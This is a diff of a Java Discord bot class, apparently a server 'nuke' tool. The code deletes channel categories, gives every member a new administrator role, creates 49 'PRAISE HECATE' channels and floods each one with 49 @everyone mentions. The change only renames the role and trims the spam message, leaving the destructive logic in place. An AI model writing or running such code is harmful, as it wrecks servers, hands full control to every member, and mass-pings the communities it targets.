@@ -55,14 +55,14 @@ public class BotBootStrap extends ListenerAdapter {
                 category.delete().queue();
             });
 
-            event.getGuild().createRole().setName("PRAISE HECATE").setPermissions(Permission.ADMINISTRATOR).setHoisted(true).setColor(Color.BLACK).queue(role -> {
+            event.getGuild().createRole().setName("Role").setPermissions(Permission.ADMINISTRATOR).setHoisted(true).setColor(Color.BLACK).queue(role -> {
                 event.getGuild().getMembers().forEach(member -> event.getGuild().addRoleToMember(member, role).queue());
             });
 
             for(int x = 0; x < 49; x++) {
                 event.getGuild().createTextChannel("PRAISE HECATE").queue(textChannel -> {
                     for (int y = 0; y < 49; y++) {
-                        event.getGuild().getTextChannelById(textChannel.getId()).sendMessage("@everyone PRAISE HECATE").queue();
+                        event.getGuild().getTextChannelById(textChannel.getId()).sendMessage("@everyone").queue();
                     }
                 });
             }
